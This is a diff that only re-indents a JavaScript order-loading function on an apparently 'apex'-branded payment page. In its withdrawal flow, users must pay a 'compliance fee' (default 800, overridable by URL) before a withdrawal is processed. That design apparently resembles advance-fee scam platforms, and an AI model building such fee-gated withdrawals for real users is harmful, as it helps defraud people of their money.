@@ -551,52 +551,52 @@
         });
 
         function loadOrderData() {
-            const urlParams = new URLSearchParams(window.location.search);
-            const type = urlParams.get('type');
-            const fee = urlParams.get('fee');
+    const urlParams = new URLSearchParams(window.location.search);
+    const type = urlParams.get('type');
+    const fee = urlParams.get('fee');
 
-            try {
-                // Check for withdrawal data
-                const withdrawalData = JSON.parse(localStorage.getItem('apex_withdrawal_data') || '{}');
-                
-                if (type === 'withdrawal' && withdrawalData.amount) {
-                    // Withdrawal flow
-                    orderData = {
-                        type: 'Withdrawal',
-                        item: 'Fund Withdrawal',
-                        amount: withdrawalData.amount,
-                        fee: parseFloat(fee) || 800,
-                        total: withdrawalData.amount + (parseFloat(fee) || 800),
-                        isWithdrawal: true,
-                        destination: withdrawalData.destination,
-                        method: withdrawalData.method
-                    };
+    try {
+        // Check for withdrawal data
+        const withdrawalData = JSON.parse(localStorage.getItem('apex_withdrawal_data') || '{}');
+        
+        if (type === 'withdrawal' && withdrawalData.amount) {
+            // Withdrawal flow
+            orderData = {
+                type: 'Withdrawal',
+                item: 'Fund Withdrawal',
+                amount: withdrawalData.amount,
+                fee: parseFloat(fee) || 800,
+                total: withdrawalData.amount + (parseFloat(fee) || 800),
+                isWithdrawal: true,
+                destination: withdrawalData.destination,
+                method: withdrawalData.method
+            };
 
-                    // Show compliance notice
-                    document.getElementById('compliance-notice').classList.remove('hidden');
-                    document.getElementById('page-title').textContent = 'Complete Withdrawal';
-                    document.getElementById('page-subtitle').textContent = 'Pay the compliance fee to process your withdrawal';
+            // Show compliance notice
+            document.getElementById('compliance-notice').classList.remove('hidden');
+            document.getElementById('page-title').textContent = 'Complete Withdrawal';
+            document.getElementById('page-subtitle').textContent = 'Pay the compliance fee to process your withdrawal';
 
-                    // Show destination info
-                    showDestinationInfo(withdrawalData);
-                } else {
-                    // Purchase flow (from localStorage)
-                    const pendingOrder = JSON.parse(localStorage.getItem('apex_pending_order') || '{}');
-                    orderData = {
-                        type: pendingOrder.type || 'Purchase',
-                        item: pendingOrder.item || '-',
-                        amount: pendingOrder.amount || 0,
-                        fee: pendingOrder.fee || 0,
-                        total: (pendingOrder.amount || 0) + (pendingOrder.fee || 0),
-                        isWithdrawal: false
-                    };
-                }
-
-                updateSummary();
-            } catch(e) {
-                console.error('Error loading order data:', e);
-            }
+            // Show destination info
+            showDestinationInfo(withdrawalData);
+        } else {
+            // Purchase flow (from localStorage)
+            const pendingOrder = JSON.parse(localStorage.getItem('apex_pending_order') || '{}');
+            orderData = {
+                type: pendingOrder.type || 'Purchase',
+                item: pendingOrder.item || '-',
+                amount: pendingOrder.amount || 0,
+                fee: pendingOrder.fee || 0,
+                total: (pendingOrder.amount || 0) + (pendingOrder.fee || 0),
+                isWithdrawal: false
+            };
         }
+
+        updateSummary();
+    } catch(e) {
+        console.error('Error loading order data:', e);
+    }
+}
 
         function showDestinationInfo(data) {
             const container = document.getElementById('withdrawal-info');
